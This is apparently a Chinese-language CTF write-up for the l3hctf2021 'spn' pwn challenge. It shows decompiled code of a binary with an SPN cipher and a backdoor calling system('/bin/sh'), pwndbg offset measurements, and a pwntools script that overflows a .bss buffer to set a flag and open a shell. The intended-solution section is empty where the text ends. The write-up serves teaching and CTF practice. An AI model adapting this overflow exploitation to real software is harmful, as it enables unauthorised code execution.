---
title: l3hctf2021_spn
top: false
comment: false
lang: zh-CN
date: 2021-11-14 14:04:14
tags:
categories:
  - CTF
  - PWN
  - wp
  - l3hctf
---

# spn

## 修改链接

使用`patchelf`修改一下`libc`和`ld`的链接；

```
$ ldd SPN_ENC 
	linux-vdso.so.1 =>  (0x00007ffe1bb7d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7c39adc000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7c3a0ac000)

$ patchelf --replace-needed libc.so.6 /home/klose/ctf/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so ./SPN_ENC 

$ patchelf --set-interpreter /lib64/2.27-ld-64.so ./SPN_ENC 

$ ldd SPN_ENC 
	linux-vdso.so.1 =>  (0x00007fffbcd2a000)
	/home/klose/ctf/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so (0x00007f9c3515f000)
	/lib64/2.27-ld-64.so => /lib64/ld-linux-x86-64.so.2 (0x00007f9c35758000)

```

## 信息收集

### checksec

```
$ checksec SPN_ENC 
[*] '/home/klose/ctf/pwn/file/adworld/l3hctf2021/spn/SPN_ENC'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### 执行分析

```
$ ./SPN_ENC 
I can encrypt your text by using SPN!
gift:0x5610096fb0e0
Nr is 4,good luck!
1.malloc
2.edit
3.free
4.show
5.backdoor
0.exit
```

### IDA

#### main



```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int INDEX; // ebx
  int choice; // [rsp+Ch] [rbp-24h]
  int idx; // [rsp+10h] [rbp-20h]
  unsigned int size[7]; // [rsp+14h] [rbp-1Ch]

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  choice = 0;
  idx = 0;
  size[0] = 0;
  puts("I can encrypt your text by using SPN!");
  printf("gift:%p\n", &shell);
  puts("Nr is 4,good luck!");
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &choice);
      if ( choice == 1 )
      {
        puts("Size:");
        __isoc99_scanf("%u", size);             // size -> size[0]
        puts("Index:");
        __isoc99_scanf("%u", &idx);
        INDEX = idx;
        ptrs[INDEX] = malloc(size[0]);
        if ( !ptrs[idx] )
        {
          puts("Malloc Error!");
          exit(0);
        }
        sizes[idx] = size[0];                   // ptr -> sizes
        puts("OK!");
      }
      if ( choice == 2 )
        break;
LABEL_13:
      if ( choice != 3 )
        goto LABEL_17;
      puts("Index:");
      __isoc99_scanf("%u", &idx);
      if ( ptrs[idx] )
      {
        free(ptrs[idx]);
        ptrs[idx] = 0LL;
LABEL_17:
        if ( choice != 4 )
          goto LABEL_21;
        puts("Index:");
        __isoc99_scanf("%u", &idx);
        if ( ptrs[idx] )
        {
          puts((const char *)ptrs[idx]);
LABEL_21:
          if ( choice == 5 )
            backdoor();
          if ( !choice )
          {
            puts("Bye");
            exit(0);
          }
        }
        else
        {
          puts("Bad Index!");
        }
      }
      else
      {
        puts("Bad Index!");
      }
    }
    puts("Index:");
    __isoc99_scanf("%u", &idx);
    if ( ptrs[idx] )
    {
      puts("Size");
      __isoc99_scanf("%u", size);
      if ( size[0] <= (unsigned __int64)(sizes[idx] + 100LL) )
      {
        puts("Content");
        memset(TEMPBUF1, 0, 0x1000uLL);
        read(0, TEMPBUF1, size[0]);
        SPN(size[0]);
        memcpy(ptrs[idx], TEMPBUF2, size[0]);
        puts("OK!");
        goto LABEL_13;
      }
      puts("TOO LARGE!");
    }
    else
    {
      puts("Bad Index!");
    }
  }
}
```



#### SPN

```c
_BYTE *__fastcall SPN(int size[0])
{
  _BYTE *result; // rax
  unsigned __int16 v2; // ST2E_2
  unsigned __int16 v3; // ax
  __int16 v4; // ax
  unsigned __int16 v5; // ax
  __int16 v6; // ax
  unsigned __int16 v7; // ax
  __int16 v8; // ax
  __int16 v9; // ax
  char v10; // cl
  int v11; // [rsp+Ch] [rbp-24h]
  unsigned __int16 v12; // [rsp+1Ah] [rbp-16h]
  __int16 v13; // [rsp+1Ch] [rbp-14h]
  __int16 v14; // [rsp+1Eh] [rbp-12h]
  __int16 v15; // [rsp+20h] [rbp-10h]
  __int16 v16; // [rsp+22h] [rbp-Eh]
  __int16 v17; // [rsp+24h] [rbp-Ch]

  v11 = size[0];
  v13 = WORD1(key);
  v14 = (unsigned __int64)key >> 12;
  v15 = (unsigned int)key >> 8;
  v16 = (unsigned __int64)key >> 4;
  result = (_BYTE *)key;
  v17 = key;
  v12 = 0;
  while ( v11 )
  {
    v2 = TEMPBUF1[v12] + (TEMPBUF1[v12 + 1] << 8);
    printf("w:%x\n", v2);
    v3 = S_Substitution((unsigned __int16)(v2 ^ v13));
    v4 = P_Substitution(v3);
    v5 = S_Substitution((unsigned __int16)(v4 ^ v14));
    v6 = P_Substitution(v5);
    v7 = S_Substitution((unsigned __int16)(v6 ^ v15));
    v8 = P_Substitution(v7);
    v9 = S_Substitution((unsigned __int16)(v8 ^ v16));
    TEMPBUF2[v12] = v9 ^ v17;
    v10 = (unsigned __int16)(v9 ^ v17) >> 8;
    result = TEMPBUF2;
    TEMPBUF2[v12 + 1] = v10;
    v12 += 2;
    v11 -= 2;
  }
  return result;
}
```

#### S_Substitution

```c
__int64 __fastcall S_Substitution(int a1)
{
  signed int i; // ebx
  unsigned __int16 v3; // [rsp+Eh] [rbp-Eh]

  v3 = 0;
  for ( i = 0; i <= 15; i += 4 )
    v3 |= SBox[(a1 & (unsigned int)(15 << i)) >> i] << i;
  return v3;
}
```

#### P_Substitution

```c
__int64 __fastcall P_Substitution(int a1)
{
  signed int i; // ebx
  unsigned __int16 v3; // [rsp+Ah] [rbp-12h]

  v3 = 0;
  for ( i = 0; i <= 15; ++i )
  {
    if ( a1 & (0x8000u >> (PBox[i] - 1)) )
      v3 |= masks[i];
  }
  return v3;
}
```

#### backdoor

```c
int backdoor()
{
  if ( !shell )
    return puts("Dont you want to be a BIG SHOT?");
  puts("Now is your chance to be a BIG SHOT");
  return system("/bin/sh");
}
```

#### .bss layout

```
.bss:00000000002020E0                 public TEMPBUF1
.bss:00000000002020E0 ; char TEMPBUF1[4096]
.bss:00000000002020E0 TEMPBUF1        db 1000h dup(?)         ; DATA XREF: SPN+82↑o
.bss:00000000002020E0                                         ; SPN+9B↑o ...
.bss:00000000002030E0                 public TEMPBUF2
.bss:00000000002030E0 ; _BYTE TEMPBUF2[4096]
.bss:00000000002030E0 TEMPBUF2        db 1000h dup(?)         ; DATA XREF: SPN+17A↑o
.bss:00000000002030E0                                         ; SPN+19A↑o ...
.bss:00000000002040E0                 public shell
.bss:00000000002040E0 shell           dq ?                    ; DATA XREF: backdoor+4↑r
.bss:00000000002040E0                                         ; main+93↑o
.bss:00000000002040E8                 align 20h
.bss:0000000000204100                 public ptrs
.bss:0000000000204100 ; void *ptrs[256]
.bss:0000000000204100 ptrs            dq 100h dup(?)          ; DATA XREF: main+14A↑o
.bss:0000000000204100                                         ; main+162↑o ...
.bss:0000000000204900                 public sizes
.bss:0000000000204900 ; _QWORD sizes[256]
.bss:0000000000204900 sizes           dq 100h dup(?)          ; DATA XREF: main+19A↑o
.bss:0000000000204900                                         ; main+245↑o
.bss:0000000000204900 _bss            ends
```

## 漏洞利用

如果要利用`backdoor`函数来getshell，需要修改`shell`的值，在main函数中给出了`shell`的地址；

### 非预期解：直接溢出

可以观察到，`shell`在`.bss`段的位置在`TEMPBUF1`和`TEMPBUF2`之下，根据对`TEMPBUF2`和`shell`的偏移`0x1000`，`TEMPBUF1`和`shell`的偏移`0x2000`；

```
pwndbg> telescope 0x5555557580e0
00:0000│   0x5555557580e0 (shell) ◂— 0xde0fde0f
01:0008│   0x5555557580e8 ◂— 0x0
... ↓
04:0020│   0x555555758100 (ptrs) —▸ 0x55555575c260 ◂— 0x3607360736073607
05:0028│   0x555555758108 (ptrs+8) ◂— 0x0
... ↓
pwndbg> telescope 0x5555557570e0
00:0000│      0x5555557570e0 (TEMPBUF2) ◂— 0x3607360736073607
01:0008│      0x5555557570e8 (TEMPBUF2+8) ◂— 0x9278927892789fce
02:0010│      0x5555557570f0 (TEMPBUF2+16) ◂— 0x9278927892789278
... ↓
pwndbg> telescope 0x5555557560e0
00:0000│   0x5555557560e0 (TEMPBUF1) ◂— 'aaaaaaaa\n'
01:0008│   0x5555557560e8 (TEMPBUF1+8) ◂— 0xa /* '\n' */
02:0010│   0x5555557560f0 (TEMPBUF1+16) ◂— 0x0

pwndbg> distance 0x5555557570e0 0x5555557580e0
0x5555557570e0->0x5555557580e0 is 0x1000 bytes (0x200 words)

pwndbg> distance 0x5555557560e0 0x5555557580e0
0x5555557560e0->0x5555557580e0 is 0x2000 bytes (0x400 words)
```

根据`SPN`函数的操作：

```c
  v8 = 0;
  while ( a1 )  // a1 = edit_size
  {
    // ... 
    TEMPBUF2[v8] = v15 ^ v13;
    result = TEMPBUF2;
    TEMPBUF2[v8 + 1] = (unsigned __int16)(v15 ^ v13) >> 8;
    v8 += 2;
    a1 -= 2;
  }
```

`TEMPBUF2`每次循环后增加两字节，并且循环`edit_size/2`次，其实就是增加了`edit_size`个字节，如果这个`edit_size`足够大，那么就有可能覆盖掉`shell`；

```python
from pwn import *
context.log_level = 'debug'
p = process('./SPN_ENC')


def recvinfo():
    p.recvuntil('SPN!\n')
    shell_addr = int(p.recvuntil('\n', drop=True)[7:20], 16)
    log.success("shell_addr => " + hex(shell_addr))

def malloc(size, index):
    # p.recvuntil("exit\n")
    p.sendline("1")
    p.recvuntil("Size:\n")
    p.sendline(str(size))
    p.recvuntil("Index:\n")
    p.sendline(str(index))

def edit(index, size, content):
    p.sendline("2")
    p.recvuntil("Index:\n")
    p.sendline(str(index))
    p.recvuntil("Size\n")
    p.sendline(str(size))
    p.recvuntil("Content\n")
    p.sendline(content)

def pwn():
    p.recvuntil("exit\n")
    p.sendline("5")
    p.interactive()

if __name__ == "__main__":
    recvinfo()
    malloc(4100, 0)              # 0x1000 = 4096
    edit(0, 4100, 'aaaa')
    pwn()
```



### 预期解：解密+溢出改shell地址

